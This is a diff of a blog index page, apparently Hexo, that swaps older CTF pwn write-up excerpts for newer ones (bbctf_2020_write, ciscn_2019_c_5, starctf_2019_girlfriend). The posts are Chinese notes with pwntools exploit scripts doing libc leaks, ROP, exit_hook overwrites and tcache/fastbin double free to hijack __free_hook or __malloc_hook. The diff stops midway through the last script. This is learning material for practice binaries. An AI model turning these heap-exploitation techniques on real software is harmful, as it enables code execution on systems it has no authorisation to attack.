@@ -115,79 +115,54 @@
     
     <div class="recent-post-item">
 
-      <a href="/2024/02/29/checkin/" class="item-title">checkin</a>
+      <a href="/2024/03/08/bbctf-2020-write/" class="item-title">bbctf_2020_write</a>
       
-      <time datetime="2024-02-29T06:36:05.000Z">
-        2024-02-29
+      <time datetime="2024-03-08T11:12:10.000Z">
+        2024-03-08
       </time>
       
       <!-- <div class="article-digest"> -->
-        <!-- 挺有意思的一道栈迁移
-s1是全局变量，这里写rop泄露got表地址
-为了再一次执行程序，rop后面接的不是puts_plt
-而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。
-buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的
-上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。
-不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的两次的payload不太一样。payload1payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
-p.sendafter(&#39;&gt;&#39;,payload1)
-
-payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)
-p.sendafter(&#39;Pass&#39;,payload2)
-
-payload2payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadg -->
+        <!-- 
+ 
+可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。为了以后方便，以后就这样算在libc-2.23中exit_hook = libc_base+0x5f0040+3848
+exit_hook = libc_base+0x5f0040+3856
+在libc-2.27中
+exit_hook = libc_base+0x619060+3840
+exit_hook = libc_base+0x619060+3848具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式exit_hook在pwn题中的应用](http://www.manongjc.com/detail/21-aktzmrsypltrrll.html))
+from  -->
         <!-- </div> -->
 
         
-        <h5 id="挺有意思的一道栈迁移"><a href="#挺有意思的一道栈迁移" class="headerlink" title="挺有意思的一道栈迁移"></a>挺有意思的一道栈迁移</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XZ5K.png" alt="image-20240229143947006"></p>
-<h5 id="s1是全局变量，这里写rop泄露got表地址"><a href="#s1是全局变量，这里写rop泄露got表地址" class="headerlink" title="s1是全局变量，这里写rop泄露got表地址"></a>s1是全局变量，这里写rop泄露got表地址</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7Xnr2.png" alt="image-20240229144209910"></p>
-<h5 id="为了再一次执行程序，rop后面接的不是puts-plt"><a href="#为了再一次执行程序，rop后面接的不是puts-plt" class="headerlink" title="为了再一次执行程序，rop后面接的不是puts_plt"></a>为了再一次执行程序，rop后面接的不是puts_plt</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XpyV.png" alt="image-20240229144608441"></p>
-<h5 id="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"><a href="#而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。" class="headerlink" title="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"></a>而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XMJI.png" alt="image-20240229144545776"></p>
-<h5 id="buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的"><a href="#buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的" class="headerlink" title="buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的"></a>buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rKsK.png" alt="image-20240229151653874"></p>
-<h5 id="上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。"><a href="#上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。" class="headerlink" title="上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。"></a>上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rbi2.png" alt="image-20240229151743757"></p>
-<h5 id="不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的"><a href="#不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的" class="headerlink" title="不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的"></a>不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的</h5><h5 id="两次的payload不太一样。"><a href="#两次的payload不太一样。" class="headerlink" title="两次的payload不太一样。"></a>两次的payload不太一样。</h5><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><pre><code class="lang-py">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
-p.sendafter(&#39;&gt;&#39;,payload1)
-
-payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)
-p.sendafter(&#39;Pass&#39;,payload2)
-</code></pre>
-<h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><pre><code class="lang-py">payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)
-
-p.sendafter(&#39;&gt;&#39;,payload1)
-payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)
-p.sendafter(&#39;Pass&#39;,payload2)
-</code></pre>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+        <p><img src="https://i0.imgs.ovh/2024/03/07/QUp53.png" alt="image-20240308192349360"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/07/QUMbe.png" alt="image-20240308192110221"> </p>
+<h5 id="可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。"><a href="#可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。" class="headerlink" title="可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。"></a>可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行<strong>run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 </strong>rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。</h5><h5 id="为了以后方便，以后就这样算"><a href="#为了以后方便，以后就这样算" class="headerlink" title="为了以后方便，以后就这样算"></a>为了以后方便，以后就这样算</h5><p><strong>在libc-2.23中</strong><br><strong>exit_hook = libc_base+0x5f0040+3848</strong></p>
+<p><strong>exit_hook = libc_base+0x5f0040+3856</strong></p>
+<p><strong>在libc-2.27中</strong></p>
+<p><strong>exit_hook = libc_base+0x619060+3840</strong></p>
+<h5 id="exit-hook-libc-base-0x619060-3848"><a href="#exit-hook-libc-base-0x619060-3848" class="headerlink" title="exit_hook = libc_base+0x619060+3848"></a>exit_hook = libc_base+0x619060+3848</h5><h5 id="具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式"><a href="#具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式" class="headerlink" title="具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式"></a>具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式</h5><p><a href="[exit_hook在pwn题中的应用 - 码农教程 (manongjc.com">exit_hook在pwn题中的应用</a>](<a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/21-aktzmrsypltrrll.html">http://www.manongjc.com/detail/21-aktzmrsypltrrll.html</a>))</p>
+<pre><code class="lang-py">from pwn import*
 from LibcSearcher import *
-p=remote(&quot;node5.buuoj.cn&quot;,25691)
-#p=process(&quot;./login_pro&quot;)
+p=remote(&quot;node5.buuoj.cn&quot;,29131)
+#p=process(&quot;./bbctf_2020_write&quot;)
 context.log_level=&quot;debug&quot;
-libc=ELF(&#39;./libc.So.6&#39;)
-bss=0x602400
-pop_rdi=0x401ab3
-puts_plt=0x4018b5
-puts_got=0x602028
-payload1=b&#39;admin\x00\x00\x00&#39;
-payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
-p.sendafter(&#39;&gt;&#39;,payload1)
+libc=ELF(&#39;./libc-2.27.so&#39;)
+p.recvuntil(&#39;puts: &#39;)
+puts_addr=int(p.recv(14),16)
+base=puts_addr-libc.sym[&#39;puts&#39;]
 
-payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)
-p.sendafter(&#39;Pass&#39;,payload2)
-p.recvuntil(&#39;BaileGeBai\n&#39;)
-puts_got=u64(p.recvuntil(&#39;\n&#39;,drop=True).ljust(8,b&#39;\x00&#39;))
-print(hex(puts_got))
-base=puts_got-libc.sym[&#39;puts&#39;]
-one=[0x45226,0x4527a,0xf03a4,0xf1247]
-one_gadget=base+one[1]
+print(&#39;put&#39;+hex(puts_addr))
+p.sendline(&#39;w&#39;)
+
+exit_hook=base++0x619060+3848
+one=[0x4f2c5,0x4f322,0x10a38c]
+one_gadget=one[1]+base
+p.sendlineafter(&#39;ptr: &#39;,str(exit_hook))
+p.sendlineafter(&#39;val: &#39;,str(one_gadget))
+
+p.sendlineafter(&#39;(q)uit&#39;,&#39;q&#39;)
+
 #gdb.attach(p)
-sleep(1)
-
-payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)
-
-p.sendafter(&#39;&gt;&#39;,payload1)
-payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)
-p.sendafter(&#39;Pass&#39;,payload2)
-
-#p.sendline(payload)
+#sleep(1)
 
 p.interactive()
 </code></pre>
@@ -196,7 +171,7 @@ p.interactive()
 
 
         <span>
-          <a class="article-read" href="/2024/02/29/checkin/"> Read more -->
+          <a class="article-read" href="/2024/03/08/bbctf-2020-write/"> Read more -->
           </span>
         </div>
 
@@ -204,108 +179,553 @@ p.interactive()
     
     <div class="recent-post-item">
 
-      <a href="/2024/01/22/ciscn-2019-es-1/" class="item-title">ciscn_2019_es_1</a>
+      <a href="/2024/03/08/ciscn-2019-c-5/" class="item-title">ciscn_2019_c_5</a>
       
-      <time datetime="2024-01-21T16:08:54.000Z">
-        2024-01-22
+      <time datetime="2024-03-08T04:49:05.000Z">
+        2024-03-08
       </time>
       
       <!-- <div class="article-digest"> -->
-        <!-- ciscn_2019_es_1checksec一下，保护全开
-addshow函数，可以输出我们想要的地址然后算偏移
-delete函数，没有把指针置零，存在UAF漏洞
-过程虽然理清，但仍然有点懵逼。先创三个堆add(0x410,&quot;AAAA&quot;)
-add(0x20,&quot;AAAA&quot;)
-add(0x20,&quot;bin/sh&quot;)
+        <!--  保护全开
+有格式化字符串漏洞但是用%n$p之类的会报错，用%p不会，算得偏移是8
 
-delete(0)
 
-libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。
-show(0)
+p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;)
+p.recvuntil(&#39;59&#39;)
+io_stder=int(p.recv(14),16)
 
-malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10
-base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]
-fre -->
+接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误
+这里对应第七个参数
+
+expfrom pwn import *
+p=process(&#39;./ciscn_2019_c_5&#39;)
+#p=remote(&#39;node5.buuoj.cn&#39;,28941)
+elf=ELF(&#39;./ciscn_2019_c_5&#39;)
+libc=elf.libc
+
+def add(size,story):
+    p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;story:&#39;,str(size))
+    p.sendl -->
         <!-- </div> -->
 
         
-        <h4 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h4><h4 id="checksec一下，保护全开"><a href="#checksec一下，保护全开" class="headerlink" title="checksec一下，保护全开"></a>checksec一下，保护全开</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJtxT.png" alt="image-20230921162920468"></p>
-<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add<img src="https://i0.imgs.ovh/2024/01/22/sJzLl.png" alt="image-20230921163026621"></h4><h4 id="show函数，可以输出我们想要的地址然后算偏移"><a href="#show函数，可以输出我们想要的地址然后算偏移" class="headerlink" title="show函数，可以输出我们想要的地址然后算偏移"></a>show函数，可以输出我们想要的地址然后算偏移</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJgZp.png" alt="image-20230921163115792"></p>
-<h4 id="delete函数，没有把指针置零，存在UAF漏洞"><a href="#delete函数，没有把指针置零，存在UAF漏洞" class="headerlink" title="delete函数，没有把指针置零，存在UAF漏洞"></a>delete函数，没有把指针置零，存在UAF漏洞</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJcDR.png" alt="image-20230921163210886"></p>
-<h4 id="过程虽然理清，但仍然有点懵逼。"><a href="#过程虽然理清，但仍然有点懵逼。" class="headerlink" title="过程虽然理清，但仍然有点懵逼。"></a>过程虽然理清，但仍然有点懵逼。</h4><h4 id="先创三个堆"><a href="#先创三个堆" class="headerlink" title="先创三个堆"></a>先创三个堆</h4><pre><code class="lang-py">add(0x410,&quot;AAAA&quot;)
-add(0x20,&quot;AAAA&quot;)
-add(0x20,&quot;bin/sh&quot;)
-
-delete(0)
+        <p> 保护全开</p>
+<p>有格式化字符串漏洞但是用%n$p之类的会报错，用%p不会，算得偏移是8</p>
+<p><img src="https://i0.imgs.ovh/2024/03/07/QOW8j.png" alt="image-20240308125027309"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/07/QO0AI.png" alt="image-20240308125159916"></p>
+<pre><code class="lang-py">p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;)
+p.recvuntil(&#39;59&#39;)
+io_stder=int(p.recv(14),16)
 </code></pre>
-<h4 id="libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。"><a href="#libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。" class="headerlink" title="libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。"></a>libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJR7N.png" alt="image-20230921163638325"></p>
-<pre><code class="lang-py">show(0)
+<h5 id="接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误"><a href="#接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误" class="headerlink" title="接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误"></a>接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误</h5><p><img src="https://i0.imgs.ovh/2024/03/07/Qe2aT.png" alt="image-20240308151037911"></p>
+<p>这里对应第七个参数</p>
+<p><img src="https://i0.imgs.ovh/2024/03/07/QeoBo.png" alt="image-20240308151240318"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *
+p=process(&#39;./ciscn_2019_c_5&#39;)
+#p=remote(&#39;node5.buuoj.cn&#39;,28941)
+elf=ELF(&#39;./ciscn_2019_c_5&#39;)
+libc=elf.libc
 
-malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10
-base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]
-free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]
-system_addr = base_addr + libc.symbols[&#39;system&#39;]
+def add(size,story):
+    p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;story:&#39;,str(size))
+    p.sendlineafter(&#39;story:&#39;,story)
+
+def edit():
+    p.sendlineafter(&#39;:&#39;,&#39;2&#39;)
+
+def show():
+    p.sendlineafter(&#39;:&#39;,&#39;3&#39;)
+
+def free(idx):
+    p.sendlineafter(&#39;:&#39;,&#39;4&#39;)
+    p.sendlineafter(&#39;index:&#39;,str(idx))
+def debug():
+    gdb.attach(p)
+    sleep(1)
+
+p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;)
+p.recvuntil(&#39;59&#39;)
+debug()
+io_stder=int(p.recv(14),16)#.ljust(8,b&#39;\x00&#39;)
+p.sendlineafter(&#39;input your ID.&#39;,&#39;kkkk&#39;)
+
+base=io_stder-libc.sym[&#39;_IO_2_1_stderr_&#39;]
+system=base+libc.sym[&#39;system&#39;]
+print(&#39;io_st  &#39;+hex(io_stder)+&#39;system  &#39;+hex(system))
+free_hook=base+libc.sym[&#39;__free_hook&#39;]
+add(0x60,&#39;aaaa&#39;) #0
+add(0x60,&#39;bbbb&#39;) #1
+add(0x60,&#39;bin/sh\n&#39;) #2
+
+free(0)
+free(1)
+free(0)
+
+add(0x60,p64(free_hook)) #3
+add(0x60,&#39;aaaa&#39;) #4
+add(0x60,&#39;dddd&#39;) #5
+add(0x60,p64(system))
+free(2)
+#
+
+p.interactive()
 </code></pre>
-<h4 id="然后用double-free，free两次堆2，然后堆2的如下，以及bin"><a href="#然后用double-free，free两次堆2，然后堆2的如下，以及bin" class="headerlink" title="然后用double free，free两次堆2，然后堆2的如下，以及bin"></a>然后用double free，free两次堆2，然后堆2的如下，以及bin</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJ1ju.png" alt="image-20230921164207791"></p>
-<p><img src="https://i0.imgs.ovh/2024/01/22/sJUkd.png" alt="image-20230921164236453"></p>
-<h4 id="bin指针链0x000055ac61f846c0这个地址记录了它本身"><a href="#bin指针链0x000055ac61f846c0这个地址记录了它本身" class="headerlink" title="bin指针链0x000055ac61f846c0这个地址记录了它本身"></a>bin指针链0x000055ac61f846c0这个地址记录了它本身</h4><h4 id="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc"><a href="#这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc" class="headerlink" title="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc"></a>这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJja2.png" alt="image-20230921164455578"></p>
-<h4 id="这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3"><a href="#这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3" class="headerlink" title="这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3"></a>这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJitK.png" alt="image-20230921164925744"></p>
-<p><img src="https://i0.imgs.ovh/2024/01/22/sJ5wj.png" alt="image-20230921165411511"></p>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/03/08/ciscn-2019-c-5/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/03/06/starctf-2019-girlfriend/" class="item-title">starctf_2019_girlfriend</a>
+      
+      <time datetime="2024-03-06T13:48:39.000Z">
+        2024-03-06
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 保护全开,本想以简单的uaf去解决，但是却会内存错误，所以这个方法不行
+from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,)
+p=process(&quot;./starctf_2019_girlfriend&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc-2.23.so&#39;)
+
+def add(size,content1,content2):
+    p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;)
+    p.sendlineafter(&quot;girl&#39;s name&quot;,str(size))
+    p.sendlineafter(&#39;please inpute her name:&#39;,content1)
+    p.sendlineafter(&#39;please input her  -->
+        <!-- </div> -->
+
+        
+        <p>保护全开,本想以简单的uaf去解决，但是却会内存错误，所以这个方法不行</p>
+<pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,)
+p=process(&quot;./starctf_2019_girlfriend&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc-2.23.so&#39;)
+
+def add(size,content1,content2):
+    p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;)
+    p.sendlineafter(&quot;girl&#39;s name&quot;,str(size))
+    p.sendlineafter(&#39;please inpute her name:&#39;,content1)
+    p.sendlineafter(&#39;please input her call:&#39;,content2)
+
+def show(index):
+    p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;Please input the index:&#39;,str(index))
+
+def free(index):
+    p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;)
+    p.sendlineafter(&#39;Please input the index:&#39;,str(index))
+
+
+add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;)
+add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)
+
+free(0)
+free(1)
+show(0)
+p.recvuntil(&#39;name:&#39;)
+main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-88
+base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;]
+system=base+libc.sym[&#39;system&#39;]
+free_hook=base+libc.sym[&#39;__free_hook&#39;]
+add(0x20,&#39;dddd&#39;,&#39;eeee&#39;)
+add(0x20,&#39;/bin/sh&#39;,&#39;cccc&#39;)
+print(&#39;main_arena&#39;+hex(main_arena))
+free(2) #2
+free(3) #3
+free(2)
+gdb.attach(p)
+sleep(1)
+
+add(0x20,p64(free_hook-0x10),&#39;dddd&#39;)
+add(0x20,&#39;cccc&#39;,&#39;dddd&#39;)
+add(0x20,&#39;eeee&#39;,&#39;vvvv&#39;)
+add(0x20,p64(system),&#39;dddd&#39;)
+
+p.interactive()
+</code></pre>
+<p><img src="https://i0.imgs.ovh/2024/03/06/QwhQd.png" alt="image-20240307120041249"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/06/Qwk1T.png" alt="image-20240306215632879"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/06/Qw0vu.png" alt="image-20240306215708434"></p>
+<h5 id="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88"><a href="#首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88" class="headerlink" title="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88"></a>首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88</h5><pre><code class="lang-py">add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)
+add(0x60,&#39;cccc&#39;,&#39;ssss&#39;)
+add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)
+free(0)
+show(0)
+p.recvuntil(&#39;name:&#39;)
+main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
+print(&#39;main_arena&#39;+hex(main_arena))
+malloc_hook=main_arena-88-0x10
+base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
+</code></pre>
+<pre><code class="lang-py">free(2)
+free(1)
+free(2)
+one = [0x45226, 0x4527a, 0xf03a4, 0xf1147]
+one_gadget=base+one[3]
+realloc=libc.sym[&#39;realloc&#39;]+base
+#这里的话得用到
+</code></pre>
+<h5 id="realloc-hook-malloc-hook-0x8"><a href="#realloc-hook-malloc-hook-0x8" class="headerlink" title="realloc_hook=malloc_hook-0x8"></a>realloc_hook=malloc_hook-0x8</h5><pre><code class="lang-py">add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23))
+add(0x60,&#39;cccc&#39;,&#39;dddd&#39;)
+add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)
+print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39;   malloc=&#39;+hex(malloc_hook-0x23)+&#39;   realloc=&#39;+hex(realloc))
+
+payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2)
+add(0x60,payload,&#39;cccc&#39;)
+</code></pre>
+<p><img src="https://i0.imgs.ovh/2024/03/06/Qso0K.png" alt="image-20240307191637279"></p>
+<h5 id="使用one-gadget的条件"><a href="#使用one-gadget的条件" class="headerlink" title="使用one_gadget的条件"></a>使用one_gadget的条件</h5><p><img src="https://i0.imgs.ovh/2024/03/06/Qsuaj.png" alt="image-20240307191828389"></p>
+<h5 id="关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址"><a href="#关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址" class="headerlink" title="关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址"></a>关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址</h5><p><a href="[使用realloc函数来调整栈帧让one_gadget生效 | ZIKH26&#39;s Blog](https://zikh26.github.io/posts/f7fd9662.html">链接文本</a>)</p>
+<h5 id="调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"><a href="#调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行" class="headerlink" title="调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"></a>调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行</h5><p><img src="https://i0.imgs.ovh/2024/03/06/QsU1O.png" alt="image-20240307193119248"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node5.buuoj.cn&quot;,25861)
+p=process(&quot;./starctf_2019_girlfriend&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc-2.23.so&#39;)
+def debug():
+    gdb.attach(p)
+    sleep(1)
+def add(size,content1,content2):
+    p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;)
+    p.sendlineafter(&quot;girl&#39;s name&quot;,str(size))
+    p.sendlineafter(&#39;please inpute her name:&#39;,content1)
+    p.sendlineafter(&#39;please input her call:&#39;,content2)
+
+def show(index):
+    p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;Please input the index:&#39;,str(index))
+
+def free(index):
+    p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;)
+    p.sendlineafter(&#39;Please input the index:&#39;,str(index))
+
+
+#add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;)
+add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;)
+add(0x60,&#39;cccc&#39;,&#39;ssss&#39;)
+add(0x60,&#39;dddd&#39;,&#39;eeee&#39;)
+free(0)
+
+show(0)
+
+
+p.recvuntil(&#39;name:&#39;)
+main_arena=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
+print(&#39;main_arena&#39;+hex(main_arena))
+malloc_hook=main_arena-88-0x10
+base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
+
+
+free(2)
+free(1)
+free(2)
